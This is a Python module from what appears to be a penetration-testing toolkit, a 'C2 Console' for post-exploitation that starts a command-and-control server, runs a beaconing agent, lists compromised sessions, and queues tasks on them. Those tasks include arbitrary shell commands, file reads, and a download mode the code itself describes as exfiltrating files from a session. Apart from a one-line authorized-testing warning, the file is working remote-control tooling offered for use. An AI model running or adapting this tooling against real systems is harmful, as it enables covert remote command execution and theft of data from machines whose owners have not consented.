"""
15 — C2 Console (Server / Agent / Sessions / Task / Download)
=============================================================
TARGET : C2 endpoint (server bind address, or http://server:port)
ENGINE : C2Server, C2Agent, C2Crypto
"""

import json
from pathlib import Path

from core import ask, ask_choice, ask_int, confirm, info, kv, table, warn
from modules.base import finish
from modules import LOCAL
from c2_module import ALLOWED_TASK_TYPES, C2Agent, C2Crypto, C2Server

NUMBER = 15
NAME = "C2 Console"
GROUP = "Post-Exploitation"
SUMMARY = "Run the C2 server/agent, list sessions, queue tasks, pull files"
TARGET = LOCAL
NEEDS = ("mode",)

MODES = ["server", "agent", "sessions", "task", "download"]


def run(session, mode: str = "", server: str = "", key: str = "",
        target: str = "", save: bool = False) -> dict:
    warn("Authorized testing only — C2 traffic must stay inside your own scope")
    print("  Modes:")
    print("    server    start a listener (agent callbacks)")
    print("    agent     run an agent that beacons to a server")
    print("    sessions  list registered sessions")
    print("    task      queue a task on a session")
    print("    download  exfiltrate a file from a session\n")

    mode = mode or ask_choice("Mode", MODES) or "sessions"
    handlers = {
        "server": _server,
        "agent": _agent,
        "sessions": _sessions,
        "task": _task,
        "download": _download,
    }
    result = handlers[mode](server=server, key=key)
    if save or confirm("Save report?", default=False):
        finish(NUMBER, NAME, server or mode, result, True)
    return result


# ---------------------------------------------------------------------------
# Modes
# ---------------------------------------------------------------------------

def _server(server: str = "", key: str = "") -> dict:
    bind = ask("Bind address", default="0.0.0.0") or "0.0.0.0"
    port = ask_int("Port", default=8080, minimum=1, maximum=65535) or 8080
    key = key or ask("Shared secret") or ""
    state = ask("State file", default="c2_state.json") or "c2_state.json"

    kv([("Bind", f"{bind}:{port}"), ("State", state)])
    info("Starting C2 server — Ctrl+C to stop")
    try:
        C2Server(bind, port, key, state_file=Path(state)).serve_forever()
    except KeyboardInterrupt:
        info("C2 server stopped")
    return {"mode": "server", "bind": bind, "port": port, "state": state}


def _agent(server: str = "", key: str = "") -> dict:
    server = server or ask("C2 server URL", default="http://127.0.0.1:8080") or ""
    key = key or ask("Shared secret") or ""
    interval = ask_int("Beacon interval (s)", default=5, minimum=1) or 5
    info(f"Beaconing to {server} every {interval}s — Ctrl+C to stop")
    try:
        C2Agent(server, key, check_in=interval).run()
    except KeyboardInterrupt:
        info("Agent stopped")
    return {"mode": "agent", "server": server, "interval": interval}


def _sessions(server: str = "", key: str = "") -> dict:
    server, key = _endpoint(server, key)
    payload = _call(server, key, "GET", "/sessions")
    sessions = payload.get("sessions", [])
    if not sessions:
        info("No sessions registered")
        return {"mode": "sessions", "sessions": []}

    online = sum(1 for s in sessions if s.get("status") == "online")
    kv([("Online", online), ("Total", len(sessions))])
    table(["Status", "Session", "Hostname", "Platform", "Privilege", "Last seen"],
          [(s.get("status", "?"), s.get("session_id", "?"), s.get("hostname", "?"),
            s.get("platform", "?")[:24], s.get("privilege", "?"),
            str(s.get("last_seen", ""))[:19]) for s in sessions])
    return {"mode": "sessions", "sessions": sessions}


def _task(server: str = "", key: str = "") -> dict:
    server, key = _endpoint(server, key)
    session_id = ask("Session ID") or ""
    task_type = ask_choice("Task type", sorted(ALLOWED_TASK_TYPES)) or "sysinfo"

    payload = {}
    if task_type == "shell":
        payload["cmd"] = ask("Command") or ""
    elif task_type in ("read_file", "list_dir", "download", "upload"):
        payload["path"] = ask("Path") or ""

    response = _call(server, key, "POST", "/beacon", {
        "queue": {"session_id": session_id, "task_type": task_type, "payload": payload}
    })
    if response.get("queued"):
        info(f"Queued {task_type} for {session_id} (task {response.get('task_id')})")
    else:
        warn(f"Queue rejected: {response}")
    return {"mode": "task", "session": session_id, "task_type": task_type, "response": response}


def _download(server: str = "", key: str = "") -> dict:
    import base64
    import time

    server, key = _endpoint(server, key)
    session_id = ask("Session ID") or ""
    remote_path = ask("Remote file path") or ""
    local_path = ask("Save to (local path)", default="downloads/file.bin") or "downloads/file.bin"

    response = _call(server, key, "POST", "/beacon", {
        "queue": {"session_id": session_id, "task_type": "download",
                  "payload": {"path": remote_path}}
    })
    if not response.get("queued"):
        warn(f"Queue rejected: {response}")
        return {"mode": "download", "error": response}
    task_id = response["task_id"]
    info(f"Queued {task_id} — waiting for the agent (up to 120s)")

    task = None
    for _ in range(60):
        time.sleep(2)
        tasks = _call(server, key, "GET", "/tasks").get("tasks", [])
        task = next((t for t in tasks if t.get("task_id") == task_id), None)
        if task and task.get("status") in ("done", "error"):
            break
    if not task or task.get("status") != "done":
        warn("Timed out waiting for the agent")
        return {"mode": "download", "task_id": task_id, "error": "timeout"}

    result = task.get("result") or {}
    if not result.get("ok"):
        warn(f"Agent download failed: {result.get('error', 'unknown')}")
        return {"mode": "download", "task_id": task_id, "error": result}

    raw = base64.b64decode((result.get("data") or {}).get("b64", ""))
    out_path = Path(local_path)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(raw)
    info(f"Saved {len(raw)} bytes -> {out_path}")
    return {"mode": "download", "task_id": task_id, "bytes": len(raw), "path": str(out_path)}


# ---------------------------------------------------------------------------
# Transport helpers
# ---------------------------------------------------------------------------

def _endpoint(server: str, key: str) -> tuple:
    server = server or ask("C2 server URL", default="http://127.0.0.1:8080") or ""
    key = key or ask("Shared secret") or ""
    return server.rstrip("/"), key


def _call(server: str, key: str, method: str, path: str, body=None) -> dict:
    """Call one C2 endpoint and transparently decrypt the envelope."""
    import requests

    crypto = C2Crypto(key)
    url = server + path
    try:
        if method == "GET":
            response = requests.get(url, timeout=10)
        else:
            response = requests.post(url, json={"enc": crypto.encrypt(json.dumps(body))}, timeout=10)
        data = response.json()
    except Exception as exc:
        warn(f"Request failed: {exc}")
        return {}

    if isinstance(data, dict) and "enc" in data:
        return json.loads(crypto.decrypt(data["enc"]))
    return data if isinstance(data, dict) else {}
